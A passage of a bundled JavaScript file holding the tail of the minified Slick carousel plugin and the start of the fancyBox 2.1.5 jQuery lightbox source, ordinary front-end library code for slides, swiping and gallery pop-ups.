0!==e.OTransform&&(i.animType="OTransform",i.transformType="-o-transform",i.transitionType="OTransition",void 0===e.perspectiveProperty&&void 0===e.webkitPerspective&&(i.animType=!1)),void 0!==e.MozTransform&&(i.animType="MozTransform",i.transformType="-moz-transform",i.transitionType="MozTransition",void 0===e.perspectiveProperty&&void 0===e.MozPerspective&&(i.animType=!1)),void 0!==e.webkitTransform&&(i.animType="webkitTransform",i.transformType="-webkit-transform",i.transitionType="webkitTransition",void 0===e.perspectiveProperty&&void 0===e.webkitPerspective&&(i.animType=!1)),void 0!==e.msTransform&&(i.animType="msTransform",i.transformType="-ms-transform",i.transitionType="msTransition",void 0===e.msTransform&&(i.animType=!1)),void 0!==e.transform&&!1!==i.animType&&(i.animType="transform",i.transformType="transform",i.transitionType="transition"),i.transformsEnabled=i.options.useTransform&&null!==i.animType&&!1!==i.animType},e.prototype.setSlideClasses=function(i){var e,t,o,s,n=this;if(t=n.$slider.find(".slick-slide").removeClass("slick-active slick-center slick-current").attr("aria-hidden","true"),n.$slides.eq(i).addClass("slick-current"),!0===n.options.centerMode){var r=n.options.slidesToShow%2==0?1:0;e=Math.floor(n.options.slidesToShow/2),!0===n.options.infinite&&(i>=e&&i<=n.slideCount-1-e?n.$slides.slice(i-e+r,i+e+1).addClass("slick-active").attr("aria-hidden","false"):(o=n.options.slidesToShow+i,t.slice(o-e+1+r,o+e+2).addClass("slick-active").attr("aria-hidden","false")),0===i?t.eq(t.length-1-n.options.slidesToShow).addClass("slick-center"):i===n.slideCount-1&&t.eq(n.options.slidesToShow).addClass("slick-center")),n.$slides.eq(i).addClass("slick-center")}else i>=0&&i<=n.slideCount-n.options.slidesToShow?n.$slides.slice(i,i+n.options.slidesToShow).addClass("slick-active").attr("aria-hidden","false"):t.length<=n.options.slidesToShow?t.addClass("slick-active").attr("aria-hidden","false"):(s=n.slideCount%n.options.slidesToShow,o=!0===n.options.infinite?n.options.slidesToShow+i:i,n.options.slidesToShow==n.options.slidesToScroll&&n.slideCount-i<n.options.slidesToShow?t.slice(o-(n.options.slidesToShow-s),o+s).addClass("slick-active").attr("aria-hidden","false"):t.slice(o,o+n.options.slidesToShow).addClass("slick-active").attr("aria-hidden","false"));"ondemand"!==n.options.lazyLoad&&"anticipated"!==n.options.lazyLoad||n.lazyLoad()},e.prototype.setupInfinite=function(){var e,t,o,s=this;if(!0===s.options.fade&&(s.options.centerMode=!1),!0===s.options.infinite&&!1===s.options.fade&&(t=null,s.slideCount>s.options.slidesToShow)){for(o=!0===s.options.centerMode?s.options.slidesToShow+1:s.options.slidesToShow,e=s.slideCount;e>s.slideCount-o;e-=1)t=e-1,i(s.$slides[t]).clone(!0).attr("id","").attr("data-slick-index",t-s.slideCount).prependTo(s.$slideTrack).addClass("slick-cloned");for(e=0;e<o+s.slideCount;e+=1)t=e,i(s.$slides[t]).clone(!0).attr("id","").attr("data-slick-index",t+s.slideCount).appendTo(s.$slideTrack).addClass("slick-cloned");s.$slideTrack.find(".slick-cloned").find("[id]").each(function(){i(this).attr("id","")})}},e.prototype.interrupt=function(i){var e=this;i||e.autoPlay(),e.interrupted=i},e.prototype.selectHandler=function(e){var t=this,o=i(e.target).is(".slick-slide")?i(e.target):i(e.target).parents(".slick-slide"),s=parseInt(o.attr("data-slick-index"));s||(s=0),t.slideCount<=t.options.slidesToShow?t.slideHandler(s,!1,!0):t.slideHandler(s)},e.prototype.slideHandler=function(i,e,t){var o,s,n,r,l,d=null,a=this;if(e=e||!1,!(!0===a.animating&&!0===a.options.waitForAnimate||!0===a.options.fade&&a.currentSlide===i))if(!1===e&&a.asNavFor(i),o=i,d=a.getLeft(o),r=a.getLeft(a.currentSlide),a.currentLeft=null===a.swipeLeft?r:a.swipeLeft,!1===a.options.infinite&&!1===a.options.centerMode&&(i<0||i>a.getDotCount()*a.options.slidesToScroll))!1===a.options.fade&&(o=a.currentSlide,!0!==t?a.animateSlide(r,function(){a.postSlide(o)}):a.postSlide(o));else if(!1===a.options.infinite&&!0===a.options.centerMode&&(i<0||i>a.slideCount-a.options.slidesToScroll))!1===a.options.fade&&(o=a.currentSlide,!0!==t?a.animateSlide(r,function(){a.postSlide(o)}):a.postSlide(o));else{if(a.options.autoplay&&clearInterval(a.autoPlayTimer),s=o<0?a.slideCount%a.options.slidesToScroll!=0?a.slideCount-a.slideCount%a.options.slidesToScroll:a.slideCount+o:o>=a.slideCount?a.slideCount%a.options.slidesToScroll!=0?0:o-a.slideCount:o,a.animating=!0,a.$slider.trigger("beforeChange",[a,a.currentSlide,s]),n=a.currentSlide,a.currentSlide=s,a.setSlideClasses(a.currentSlide),a.options.asNavFor&&(l=(l=a.getNavTarget()).slick("getSlick")).slideCount<=l.options.slidesToShow&&l.setSlideClasses(a.currentSlide),a.updateDots(),a.updateArrows(),!0===a.options.fade)return!0!==t?(a.fadeSlideOut(n),a.fadeSlide(s,function(){a.postSlide(s)})):a.postSlide(s),void a.animateHeight();!0!==t?a.animateSlide(d,function(){a.postSlide(s)}):a.postSlide(s)}},e.prototype.startLoad=function(){var i=this;!0===i.options.arrows&&i.slideCount>i.options.slidesToShow&&(i.$prevArrow.hide(),i.$nextArrow.hide()),!0===i.options.dots&&i.slideCount>i.options.slidesToShow&&i.$dots.hide(),i.$slider.addClass("slick-loading")},e.prototype.swipeDirection=function(){var i,e,t,o,s=this;return i=s.touchObject.startX-s.touchObject.curX,e=s.touchObject.startY-s.touchObject.curY,t=Math.atan2(e,i),(o=Math.round(180*t/Math.PI))<0&&(o=360-Math.abs(o)),o<=45&&o>=0?!1===s.options.rtl?"left":"right":o<=360&&o>=315?!1===s.options.rtl?"left":"right":o>=135&&o<=225?!1===s.options.rtl?"right":"left":!0===s.options.verticalSwiping?o>=35&&o<=135?"down":"up":"vertical"},e.prototype.swipeEnd=function(i){var e,t,o=this;if(o.dragging=!1,o.swiping=!1,o.scrolling)return o.scrolling=!1,!1;if(o.interrupted=!1,o.shouldClick=!(o.touchObject.swipeLength>10),void 0===o.touchObject.curX)return!1;if(!0===o.touchObject.edgeHit&&o.$slider.trigger("edge",[o,o.swipeDirection()]),o.touchObject.swipeLength>=o.touchObject.minSwipe){switch(t=o.swipeDirection()){case"left":case"down":e=o.options.swipeToSlide?o.checkNavigable(o.currentSlide+o.getSlideCount()):o.currentSlide+o.getSlideCount(),o.currentDirection=0;break;case"right":case"up":e=o.options.swipeToSlide?o.checkNavigable(o.currentSlide-o.getSlideCount()):o.currentSlide-o.getSlideCount(),o.currentDirection=1}"vertical"!=t&&(o.slideHandler(e),o.touchObject={},o.$slider.trigger("swipe",[o,t]))}else o.touchObject.startX!==o.touchObject.curX&&(o.slideHandler(o.currentSlide),o.touchObject={})},e.prototype.swipeHandler=function(i){var e=this;if(!(!1===e.options.swipe||"ontouchend"in document&&!1===e.options.swipe||!1===e.options.draggable&&-1!==i.type.indexOf("mouse")))switch(e.touchObject.fingerCount=i.originalEvent&&void 0!==i.originalEvent.touches?i.originalEvent.touches.length:1,e.touchObject.minSwipe=e.listWidth/e.options.touchThreshold,!0===e.options.verticalSwiping&&(e.touchObject.minSwipe=e.listHeight/e.options.touchThreshold),i.data.action){case"start":e.swipeStart(i);break;case"move":e.swipeMove(i);break;case"end":e.swipeEnd(i)}},e.prototype.swipeMove=function(i){var e,t,o,s,n,r,l=this;return n=void 0!==i.originalEvent?i.originalEvent.touches:null,!(!l.dragging||l.scrolling||n&&1!==n.length)&&(e=l.getLeft(l.currentSlide),l.touchObject.curX=void 0!==n?n[0].pageX:i.clientX,l.touchObject.curY=void 0!==n?n[0].pageY:i.clientY,l.touchObject.swipeLength=Math.round(Math.sqrt(Math.pow(l.touchObject.curX-l.touchObject.startX,2))),r=Math.round(Math.sqrt(Math.pow(l.touchObject.curY-l.touchObject.startY,2))),!l.options.verticalSwiping&&!l.swiping&&r>4?(l.scrolling=!0,!1):(!0===l.options.verticalSwiping&&(l.touchObject.swipeLength=r),t=l.swipeDirection(),void 0!==i.originalEvent&&l.touchObject.swipeLength>4&&(l.swiping=!0,i.preventDefault()),s=(!1===l.options.rtl?1:-1)*(l.touchObject.curX>l.touchObject.startX?1:-1),!0===l.options.verticalSwiping&&(s=l.touchObject.curY>l.touchObject.startY?1:-1),o=l.touchObject.swipeLength,l.touchObject.edgeHit=!1,!1===l.options.infinite&&(0===l.currentSlide&&"right"===t||l.currentSlide>=l.getDotCount()&&"left"===t)&&(o=l.touchObject.swipeLength*l.options.edgeFriction,l.touchObject.edgeHit=!0),!1===l.options.vertical?l.swipeLeft=e+o*s:l.swipeLeft=e+o*(l.$list.height()/l.listWidth)*s,!0===l.options.verticalSwiping&&(l.swipeLeft=e+o*s),!0!==l.options.fade&&!1!==l.options.touchMove&&(!0===l.animating?(l.swipeLeft=null,!1):void l.setCSS(l.swipeLeft))))},e.prototype.swipeStart=function(i){var e,t=this;if(t.interrupted=!0,1!==t.touchObject.fingerCount||t.slideCount<=t.options.slidesToShow)return t.touchObject={},!1;void 0!==i.originalEvent&&void 0!==i.originalEvent.touches&&(e=i.originalEvent.touches[0]),t.touchObject.startX=t.touchObject.curX=void 0!==e?e.pageX:i.clientX,t.touchObject.startY=t.touchObject.curY=void 0!==e?e.pageY:i.clientY,t.dragging=!0},e.prototype.unfilterSlides=e.prototype.slickUnfilter=function(){var i=this;null!==i.$slidesCache&&(i.unload(),i.$slideTrack.children(this.options.slide).detach(),i.$slidesCache.appendTo(i.$slideTrack),i.reinit())},e.prototype.unload=function(){var e=this;i(".slick-cloned",e.$slider).remove(),e.$dots&&e.$dots.remove(),e.$prevArrow&&e.htmlExpr.test(e.options.prevArrow)&&e.$prevArrow.remove(),e.$nextArrow&&e.htmlExpr.test(e.options.nextArrow)&&e.$nextArrow.remove(),e.$slides.removeClass("slick-slide slick-active slick-visible slick-current").attr("aria-hidden","true").css("width","")},e.prototype.unslick=function(i){var e=this;e.$slider.trigger("unslick",[e,i]),e.destroy()},e.prototype.updateArrows=function(){var i=this;Math.floor(i.options.slidesToShow/2),!0===i.options.arrows&&i.slideCount>i.options.slidesToShow&&!i.options.infinite&&(i.$prevArrow.removeClass("slick-disabled").attr("aria-disabled","false"),i.$nextArrow.removeClass("slick-disabled").attr("aria-disabled","false"),0===i.currentSlide?(i.$prevArrow.addClass("slick-disabled").attr("aria-disabled","true"),i.$nextArrow.removeClass("slick-disabled").attr("aria-disabled","false")):i.currentSlide>=i.slideCount-i.options.slidesToShow&&!1===i.options.centerMode?(i.$nextArrow.addClass("slick-disabled").attr("aria-disabled","true"),i.$prevArrow.removeClass("slick-disabled").attr("aria-disabled","false")):i.currentSlide>=i.slideCount-1&&!0===i.options.centerMode&&(i.$nextArrow.addClass("slick-disabled").attr("aria-disabled","true"),i.$prevArrow.removeClass("slick-disabled").attr("aria-disabled","false")))},e.prototype.updateDots=function(){var i=this;null!==i.$dots&&(i.$dots.find("li").removeClass("slick-active").end(),i.$dots.find("li").eq(Math.floor(i.currentSlide/i.options.slidesToScroll)).addClass("slick-active"))},e.prototype.visibility=function(){var i=this;i.options.autoplay&&(document[i.hidden]?i.interrupted=!0:i.interrupted=!1)},i.fn.slick=function(){var i,t,o=this,s=arguments[0],n=Array.prototype.slice.call(arguments,1),r=o.length;for(i=0;i<r;i++)if("object"==typeof s||void 0===s?o[i].slick=new e(o[i],s):t=o[i].slick[s].apply(o[i].slick,n),void 0!==t)return t;return o}});

/*!
 * fancyBox - jQuery Plugin
 * version: 2.1.5 (Fri, 14 Jun 2013)
 * @requires jQuery v1.6 or later
 *
 * Examples at http://fancyapps.com/fancybox/
 * License: www.fancyapps.com/fancybox/#license
 *
 * Copyright 2012 Janis Skarnelis - janis@fancyapps.com
 *
 */

(function (window, document, $, undefined) {
	"use strict";

	var H = $("html"),
		W = $(window),
		D = $(document),
		F = $.fancybox = function () {
			F.open.apply( this, arguments );
		},
		IE =  navigator.userAgent.match(/msie/i),
		didUpdate	= null,
		isTouch		= document.createTouch !== undefined,

		isQuery	= function(obj) {
			return obj && obj.hasOwnProperty && obj instanceof $;
		},
		isString = function(str) {
			return str && $.type(str) === "string";
		},
		isPercentage = function(str) {
			return isString(str) && str.indexOf('%') > 0;
		},
		isScrollable = function(el) {
			return (el && !(el.style.overflow && el.style.overflow === 'hidden') && ((el.clientWidth && el.scrollWidth > el.clientWidth) || (el.clientHeight && el.scrollHeight > el.clientHeight)));
		},
		getScalar = function(orig, dim) {
			var value = parseInt(orig, 10) || 0;

			if (dim && isPercentage(orig)) {
				value = F.getViewport()[ dim ] / 100 * value;
			}

			return Math.ceil(value);
		},
		getValue = function(value, dim) {
			return getScalar(value, dim) + 'px';
		};

	$.extend(F, {
		// The current version of fancyBox
		version: '2.1.5',

		defaults: {
			padding : 15,
			margin  : 20,

			width     : 800,
			height    : 600,
			minWidth  : 100,
			minHeight : 100,
			maxWidth  : 9999,
			maxHeight : 9999,
			pixelRatio: 1, // Set to 2 for retina display support

			autoSize   : true,
			autoHeight : false,
			autoWidth  : false,

			autoResize  : true,
			autoCenter  : !isTouch,
			fitToView   : true,
			aspectRatio : false,
			topRatio    : 0.5,
			leftRatio   : 0.5,

			scrolling : 'auto', // 'auto', 'yes' or 'no'
			wrapCSS   : '',

			arrows     : true,
			closeBtn   : true,
			closeClick : false,
			nextClick  : false,
			mouseWheel : true,
			autoPlay   : false,
			playSpeed  : 3000,
			preload    : 3,
			modal      : false,
			loop       : true,

			ajax  : {
				dataType : 'html',
				headers  : { 'X-fancyBox': true }
			},
			iframe : {
				scrolling : 'auto',
				preload   : true
			},
			swf : {
				wmode: 'transparent',
				allowfullscreen   : 'true',
				allowscriptaccess : 'always'
			},

			keys  : {
				next : {
					13 : 'left', // enter
					34 : 'up',   // page down
					39 : 'left', // right arrow
					40 : 'up'    // down arrow
				},
				prev : {
					8  : 'right',  // backspace
					33 : 'down',   // page up
					37 : 'right',  // left arrow
					38 : 'down'    // up arrow
				},
				close  : [27], // escape key
				play   : [32], // space - start/stop slideshow
				toggle : [70]  // letter "f" - toggle fullscreen
			},

			direction : {
				next : 'left',
				prev : 'right'
			},

			scrollOutside  : true,

			// Override some properties
			index   : 0,
			type    : null,
			href    : null,
			content : null,
			title   : null,

			// HTML templates
			tpl: {
				wrap     : '<div class="fancybox-wrap" tabIndex="-1"><div class="fancybox-skin"><div class="fancybox-outer"><div class="fancybox-inner"></div></div></div></div>',
				image    : '<img class="fancybox-image" src="{href}" alt="" />',
				iframe   : '<iframe id="fancybox-frame{rnd}" name="fancybox-frame{rnd}" class="fancybox-iframe" frameborder="0" vspace="0" hspace="0" webkitAllowFullScreen mozallowfullscreen allowFullScreen' + (IE ? ' allowtransparency="true"' : '') + '></iframe>',
				error    : '<p class="fancybox-error">The requested content cannot be loaded.<br/>Please try again later.</p>',
				closeBtn : '<a title="Close" class="fancybox-item fancybox-close" href="javascript:;"></a>',
				next     : '<a title="Next" class="fancybox-nav fancybox-next" href="javascript:;"><span></span></a>',
				prev     : '<a title="Previous" class="fancybox-nav fancybox-prev" href="javascript:;"><span></span></a>'
			},

			// Properties for each animation type
			// Opening fancyBox
			openEffect  : 'fade', // 'elastic', 'fade' or 'none'
			openSpeed   : 250,
			openEasing  : 'swing',
			openOpacity : true,
			openMethod  : 'zoomIn',

			// Closing fancyBox
			closeEffect  : 'fade', // 'elastic', 'fade' or 'none'
			closeSpeed   : 250,
			closeEasing  : 'swing',
			closeOpacity : true,
			closeMethod  : 'zoomOut',

			// Changing next gallery item
			nextEffect : 'elastic', // 'elastic', 'fade' or 'none'
			nextSpeed  : 250,
			nextEasing : 'swing',
			nextMethod : 'changeIn',

			// Changing previous gallery item
			prevEffect : 'elastic', // 'elastic', 'fade' or 'none'
			prevSpeed  : 250,
			prevEasing : 'swing',
			prevMethod : 'changeOut',

			// Enable default helpers
			helpers : {
				overlay : true,
				title   : true
			},

			// Callbacks
			onCancel     : $.noop, // If canceling
			beforeLoad   : $.noop, // Before loading
			afterLoad    : $.noop, // After loading
			beforeShow   : $.noop, // Before changing in current item
			afterShow    : $.noop, // After opening
			beforeChange : $.noop, // Before changing gallery item
			beforeClose  : $.noop, // Before closing
			afterClose   : $.noop  // After closing
		},

		//Current state
		group    : {}, // Selected group
		opts     : {}, // Group options
		previous : null,  // Previous element
		coming   : null,  // Element being loaded
		current  : null,  // Currently loaded element
		isActive : false, // Is activated
		isOpen   : false, // Is currently open
		isOpened : false, // Have been fully opened at least once

		wrap  : null,
		skin  : null,
		outer : null,
		inner : null,

		player : {
			timer    : null,
			isActive : false
		},

		// Loaders
		ajaxLoad   : null,
		imgPreload : null,

		// Some collections
		transitions : {},
		helpers     : {},

		/*
		 *	Static methods
		 */

		open: function (group, opts) {
			if (!group) {
				return;
			}

			if (!$.isPlainObject(opts)) {
				opts = {};
			}

			// Close if already active
			if (false === F.close(true)) {
				return;
			}

			// Normalize group
			if (!$.isArray(group)) {
				group = isQuery(group) ? $(group).get() : [group];
			}

			// Recheck if the type of each element is `object` and set content type (image, ajax, etc)
			$.each(group, function(i, element) {
				var obj = {},
					href,
					title,
					content,
					type,
					rez,
					hrefParts,
					selector;

				if ($.type(element) === "object") {
					// Check if is DOM element
					if (element.nodeType) {
						element = $(element);
					}

					if (isQuery(element)) {
						obj = {
							href    : element.data('fancybox-href') || element.attr('href'),
							title   : element.data('fancybox-title') || element.attr('title'),
							isDom   : true,
							element : element
						};

						if ($.metadata) {
							$.extend(true, obj, element.metadata());
						}

					} else {
						obj = element;
					}
				}

				href  = opts.href  || obj.href || (isString(element) ? element : null);
				title = opts.title !== undefined ? opts.title : obj.title || '';

				content = opts.content || obj.content;
				type    = content ? 'html' : (opts.type  || obj.type);

				if (!type && obj.isDom) {
					type = element.data('fancybox-type');

					if (!type) {
						rez  = element.prop('class').match(/fancybox\.(\w+)/);
						type = rez ? rez[1] : null;
					}
				}

				if (isString(href)) {
					// Try to guess the content type
					if (!type) {
						if (F.isImage(href)) {
							type = 'image';

						} else if (F.isSWF(href)) {
							type = 'swf';

						} else if (href.charAt(0) === '#') {
							type = 'inline';

						} else if (isString(element)) {
							type    = 'html';
							content = element;
						}
					}

					// Split url into two pieces with source url and content selector, e.g,
					// "/mypage.html #my_id" will load "/mypage.html" and display element having id "my_id"
					if (type === 'ajax') {
						hrefParts = href.split(/\s+/, 2);
						href      = hrefParts.shift();
						selector  = hrefParts.shift();
					}
				}

				if (!content) {
					if (type === 'inline') {
						if (href) {
							content = $( isString(href) ? href.replace(/.*(?=#[^\s]+$)/, '') : href ); //strip for ie7

						} else if (obj.isDom) {
							content = element;
						}

					} else if (type === 'html') {
						content = href;

					} else if (!type && !href && obj.isDom) {
						type    = 'inline';
						content = element;
					}
				}

				$.extend(obj, {
					href     : href,
					type     : type,
					content  : content,
					title    : title,
					selector : selector
				});

				group[ i ] = obj;
			});

			// Extend the defaults
			F.opts = $.extend(true, {}, F.defaults, opts);

			// All options are merged recursive except keys
			if (opts.keys !== undefined) {
				F.opts.keys = opts.keys ? $.extend({}, F.defaults.keys, opts.keys) : false;
			}

			F.group = group;

			return F._start(F.opts.index);
		},

		// Cancel image loading or abort ajax request
		cancel: function () {
			var coming = F.coming;

			if (!coming || false === F.trigger('onCancel')) {
				return;
			}

			F.hideLoading();

			if (F.ajaxLoad) {
				F.ajaxLoad.abort();
			}

			F.ajaxLoad = null;

			if (F.imgPreload) {
				F.imgPreload.onload = F.imgPreload.onerror = null;
			}

			if (coming.wrap) {
				coming.wrap.stop(true, true).trigger('onReset').remove();
			}

			F.coming = null;

			// If the first item has been canceled, then clear everything
			if (!F.current) {
				F._afterZoomOut( coming );
			}
		},

		// Start closing animation if is open; remove immediately if opening/closing
		close: function (event) {
			F.cancel();

			if (false === F.trigger('beforeClose')) {
				return;
			}

			F.unbindEvents();

			if (!F.isActive) {
				return;
			}

			if (!F.isOpen || event === true) {
				$('.fancybox-wrap').stop(true).trigger('onReset').remove();

				F._afterZoomOut();

			} else {
				F.isOpen = F.isOpened = false;
				F.isClosing = true;

				$('.fancybox-item, .fancybox-nav').remove();

				F.wrap.stop(true, true).removeClass('fancybox-opened');

				F.transitions[ F.current.closeMethod ]();
			}
		},

		// Manage slideshow:
		//   $.fancybox.play(); - toggle slideshow
		//   $.fancybox.play( true ); - start
		//   $.fancybox.play( false ); - stop
		play: function ( action ) {
			var clear = function () {
					clearTimeout(F.player.timer);
				},
				set = function () {
					clear();

					if (F.current && F.player.isActive) {
						F.player.timer = setTimeout(F.next, F.current.playSpeed);
					}
				},
				stop = function () {
					clear();

					D.unbind('.player');

					F.player.isActive = false;

					F.trigger('onPlayEnd');
				},
				start = function () {
					if (F.current && (F.current.loop || F.current.index < F.group.length - 1)) {
						F.player.isActive = true;

						D.bind({
							'onCancel.player beforeClose.player' : stop,
							'onUpdate.player'   : set,
							'beforeLoad.player' : clear
						});

						set();

						F.trigger('onPlayStart');
					}
				};

			if (action === true || (!F.player.isActive && action !== false)) {
				start();
			} else {
				stop();
			}
		},

		// Navigate to next gallery item
		next: function ( direction ) {
			var current = F.current;

			if (current) {
				if (!isString(direction)) {
					direction = current.direction.next;
				}

				F.jumpto(current.index + 1, direction, 'next');
			}
		},

		// Navigate to previous gallery item
		prev: function ( direction ) {
			var current = F.current;

			if (current) {
				if (!isString(direction)) {
					direction = current.direction.prev;
				}

				F.jumpto(current.index - 1, direction, 'prev');
			}
		},

		// Navigate to gallery item by index
		jumpto: function ( index, direction, router ) {
			var current = F.current;

			if (!current) {
				return;
			}

			index = getScalar(index);

			F.direction = direction || current.direction[ (index >= current.index ? 'next' : 'prev') ];
			F.router    = router || 'jumpto';

			if (current.loop) {
				if (index < 0) {
					index = current.group.length + (index % current.group.length);
				}

				index = index % current.group.length;
			}

			if (current.group[ index ] !== undefined) {
				F.cancel();

				F._start(index);
			}
		},

		// Center inside viewport and toggle position type to fixed or absolute if needed
		reposition: function (e, onlyAbsolute) {
			var current = F.current,
				wrap    = current ? current.wrap : null,
				pos;

			if (wrap) {
				pos = F._getPosition(onlyAbsolute);

				if (e && e.type === 'scroll') {
					delete pos.position;

					wrap.stop(true, true).animate(pos, 200);

				} else {
					wrap.css(pos);

					current.pos = $.extend({}, current.dim, pos);
				}
			}
		},

		update: function (e) {
			var type = (e && e.type),
				anyway = !type || type === 'orientationchange';

			if (anyway) {
				clearTimeout(didUpdate);

				didUpdate = null;
			}

			if (!F.isOpen || didUpdate) {
				return;
			}

			didUpdate = setTimeout(function() {
				var current = F.current;

				if (!current || F.isClosing) {
					return;
				}

				F.wrap.removeClass('fancybox-tmp');

				if (anyway || type === 'load' || (type === 'resize' && current.autoResize)) {
					F._setDimension();
				}

				if (!(type === 'scroll' && current.canShrink)) {
					F.reposition(e);
				}

				F.trigger('onUpdate');

				didUpdate = null;

			}, (anyway && !isTouch ? 0 : 300));
		},

		// Shrink content to fit inside viewport or restore if resized
		toggle: function ( action ) {
			if (F.isOpen) {
				F.current.fitToView = $.type(action) === "boolean" ? action : !F.current.fitToView;

				// Help browser to restore document dimensions
				if (isTouch) {
					F.wrap.removeAttr('style').addClass('fancybox-tmp');

					F.trigger('onUpdate');
				}

				F.update();
			}
		},

		hideLoading: function () {
			D.unbind('.loading');

			$('#fancybox-loading').remove();
		},

		showLoading: function () {
			var el, viewport;

			F.hideLoading();

			el = $('<div id="fancybox-loading"><div></div></div>').click(F.cancel).appendTo('body');

			// If user will press the escape-button, the request will be canceled
			D.bind('keydown.loading', function(e) {
				if ((e.which || e.keyCode) === 27) {
					e.preventDefault();

					F.cancel();
				}
			});

			if (!F.defaults.fixed) {
				viewport = F.getViewport();

				el.css({
					position : 'absolute',
					top  : (viewport.h * 0.5) + viewport.y,
					left : (viewport.w * 0.5) + viewport.x
				});
			}
		},

		getViewport: function () {
			var locked = (F.current && F.current.locked) || false,
				rez    = {
					x: W.scrollLeft(),
					y: W.scrollTop()
				};

			if (locked) {
				rez.w = locked[0].clientWidth;
				rez.h = locked[0].clientHeight;

			} else {
				// See http://bugs.jquery.com/ticket/6724
				rez.w = isTouch && window.innerWidth  ? window.innerWidth  : W.width();
				rez.h = isTouch && window.innerHeight ? window.innerHeight : W.height();
			}

			return rez;
		},

		// Unbind the keyboard / clicking actions
		unbindEvents: function () {
			if (F.wrap && isQuery(F.wrap)) {
				F.wrap.unbind('.fb');
			}

			D.unbind('.fb');
			W.unbind('.fb');
		},

		bindEvents: function () {
			var current = F.current,
				keys;

			if (!current) {
				return;
			}

			// Changing document height on iOS devices triggers a 'resize' event,
			// that can change document height... repeating infinitely
			W.bind('orientationchange.fb' + (isTouch ? '' : ' resize.fb') + (current.autoCenter && !current.locked ? ' scroll.fb' : ''), F.update);

			keys = current.keys;

			if (keys) {
				D.bind('keydown.fb', function (e) {
					var code   = e.which || e.keyCode,
						target = e.target || e.srcElement;

					// Skip esc key if loading, because showLoading will cancel preloading
					if (code === 27 && F.coming) {
						return false;
					}

					// Ignore key combinations and key events within form elements
					if (!e.ctrlKey && !e.altKey && !e.shiftKey && !e.metaKey && !(target && (target.type || $(target).is('[contenteditable]')))) {
						$.each(keys, function(i, val) {
							if (current.group.length > 1 && val[ code ] !== undefined) {
								F[ i ]( val[ code ] );

								e.preventDefault();
								return false;
							}

							if ($.inArray(code, val) > -1) {
								F[ i ] ();

								e.preventDefault();
								return false;
							}
						});
					}
				});
			}

			if ($.fn.mousewheel && current.mouseWheel) {
				F.wrap.bind('mousewheel.fb', function (e, delta, deltaX, deltaY) {
					var target = e.target || null,
						parent = $(target),
						canScroll = false;

					while (parent.length) {
						if (canScroll || parent.is('.fancybox-skin') || parent.is('.fancybox-wrap')) {
							break;
						}

						canScroll = isScrollable( parent[0] );
						parent    = $(parent).parent();
					}

					if (delta !== 0 && !canScroll) {
						if (F.group.length > 1 && !current.canShrink) {
							if (deltaY > 0 || deltaX > 0) {
								F.prev( deltaY > 0 ? 'down' : 'left' );

							} else if (deltaY < 0 || deltaX < 0) {
								F.next( deltaY < 0 ? 'up' : 'right' );
							}

							e.preventDefault();
						}
					}
				});
			}
		},

		trigger: function (event, o) {
			var ret, obj = o || F.coming || F.current;

			if (!obj) {
				return;
			}

			if ($.isFunction( obj[event] )) {
				ret = obj[event].apply(obj, Array.prototype.slice.call(arguments, 1));
			}

			if (ret === false) {
				return false;
			}

			if (obj.helpers) {
				$.each(obj.helpers, function (helper, opts) {
					if (opts && F.helpers[helper] && $.isFunction(F.helpers[helper][event])) {
						F.helpers[helper][event]($.extend(true, {}, F.helpers[helper].defaults, opts), obj);
					}
				});
			}

			D.trigger(event);
		},

		isImage: function (str) {
			return isString(str) && str.match(/(^data:image\/.*,)|(\.(jp(e|g|eg)|gif|png|bmp|webp|svg)((\?|#).*)?$)/i);
		},

		isSWF: function (str) {
			return isString(str) && str.match(/\.(swf)((\?|#).*)?$/i);
		},

		_start: function (index) {
			var coming = {},
				obj,
				href,
				type,
				margin,
				padding;

			index = getScalar( index );
			obj   = F.group[ index ] || null;

			if (!obj) {
				return false;
			}

			coming = $.extend(true, {}, F.opts, obj);

			// Convert margin and padding properties to array - top, right, bottom, left
			margin  = coming.margin;
			padding = coming.padding;

			if ($.type(margin) === 'number') {
				coming.margin = [margin, margin, margin, margin];
			}

			if ($.type(padding) === 'number') {
				coming.padding = [padding, padding, padding, padding];
			}

			// 'modal' propery is just a shortcut
			if (coming.modal) {
				$.extend(true, coming, {
					closeBtn   : false,
					closeClick : false,
					nextClick  : false,
					arrows     : false,
					mouseWheel : false,
					keys       : null,
					helpers: {
						overlay : {
							closeClick : false
						}
					}
				});
			}

			// 'autoSize' property is a shortcut, too
			if (coming.autoSize) {
				coming.autoWidth = coming.autoHeight = true;
			}

			if (coming.width === 'auto') {
				coming.autoWidth = true;
			}

			if (coming.height === 'auto') {
				coming.autoHeight = true;
			}

			/*
			 * Add reference to the group, so it`s possible to access from callbacks, example:
			 * afterLoad : function() {
			 *     this.title = 'Image ' + (this.index + 1) + ' of ' + this.group.length + (this.title ? ' - ' + this.title : '');
			 * }
			 */

			coming.group  = F.group;
			coming.index  = index;

			// Give a chance for callback or helpers to update coming item (type, title, etc)
			F.coming = coming;

			if (false === F.trigger('beforeLoad')) {
				F.coming = null;

				return;
			}

			type = coming.type;
			href = coming.href;

			if (!type) {
				F.coming = null;

				//If we can not determine content type then drop silently or display next/prev item if looping through gallery
				if (F.current && F.router && F.router !== 'jumpto') {
					F.current.index = index;

					return F[ F.router ]( F.direction );
				}

				return false;
			}

			F.isActive = true;

			if (type === 'image' || type === 'swf') {
				coming.autoHeight = coming.autoWidth = false;
				coming.scrolling  = 'visible';
			}

			if (type === 'image') {
				coming.aspectRatio = true;
			}

			if (type === 'iframe' && isTouch) {
				coming.scrolling = 'scroll';
			}

			// Build the neccessary markup
			coming.wrap = $(coming.tpl.wrap).addClass('fancybox-' + (isTouch ? 'mobile' : 'desktop') + ' fancybox-type-' + type + ' fancybox-tmp ' + coming.wrapCSS).appendTo( coming.parent || 'body' );

			$.extend(coming, {
				skin  : $('.fancybox-skin',  coming.wrap),
				outer : $('.fancybox-outer', coming.wrap),
				inner : $('.fancybox-inner', coming.wrap)
			});

			$.each(["Top", "Right", "Bottom", "Left"], function(i, v) {
				coming.skin.css('padding' + v, getValue(coming.padding[ i ]));
			});

			F.trigger('onReady');

			// Check before try to load; 'inline' and 'html' types need content, others - href
			if (type === 'inline' || type === 'html') {
				if (!coming.content || !coming.content.length) {
					return F._error( 'content' );
				}

			} else if (!href) {
				return F._error( 'href' );
			}

			if (type === 'image') {
				F._loadImage();

			} else if (type === 'ajax') {
				F._loadAjax();

			} else if (type === 'iframe') {
				F._loadIframe();

			} else {
				F._afterLoad();
			}
		},

		_error: function ( type ) {
			$.extend(F.coming, {
				type       : 'html',
				autoWidth  : true,
				autoHeight : true,
